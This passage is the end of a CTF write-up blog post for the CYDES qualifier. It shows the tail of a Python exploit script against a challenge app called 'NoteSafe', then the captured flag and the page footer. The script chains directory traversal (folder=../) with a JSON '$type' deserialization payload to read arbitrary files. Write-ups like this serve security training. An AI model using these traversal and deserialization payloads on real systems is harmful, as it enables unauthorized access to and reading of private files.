login_response.url.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Both registration and login failed!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Login successful!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Registration successful!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 1: Directory traversal to find flag file</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Finding flag file...&quot;</span>)</span><br><span class="line">    response = session.get(<span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/api/files/list?folder=../&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extract flag filename from JSON response</span></span><br><span class="line">    flag_file = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="comment"># Look for flag file in JSON response</span></span><br><span class="line">        flag_match = re.search(<span class="string">r&#x27;&quot;name&quot;:&quot;(flag-[A-Za-z0-9]+\.txt)&quot;&#x27;</span>, response.text)</span><br><span class="line">        <span class="keyword">if</span> flag_match:</span><br><span class="line">            flag_file = flag_match.group(<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found flag file: <span class="subst">&#123;flag_file&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] No flag file found in directory listing&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Response: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Directory traversal failed: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 2: JSON deserialization to read flag</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Reading flag file...&quot;</span>)</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;$type&quot;</span>: <span class="string">&quot;NoteSafe.Services.FileSystemService, NoteSafe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;FilePath&quot;</span>: <span class="string">f&quot;/<span class="subst">&#123;flag_file&#125;</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/api/notes&quot;</span>, json=payload, headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extract flag content</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;FileContents&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;&quot;FileContents&quot;:&quot;([^&quot;]*)&quot;&#x27;</span>, response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            content = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] FLAG: <span class="subst">&#123;content&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Could not extract flag content&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] No FileContents in response: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+
+<p>flag <code>prelim&#123;buzzw0rd5_4r3_n0t_3ncrypt10n&#125;</code></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Megat Zafran</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://ilikeronnnnii.github.io/2025/07/01/cydes-qualifier/">https://ilikeronnnnii.github.io/2025/07/01/cydes-qualifier/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>peepo pog</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2025/03/17/pentest/">CompTIA PenTest+ (PT0-002) Review</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Megat Zafran | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
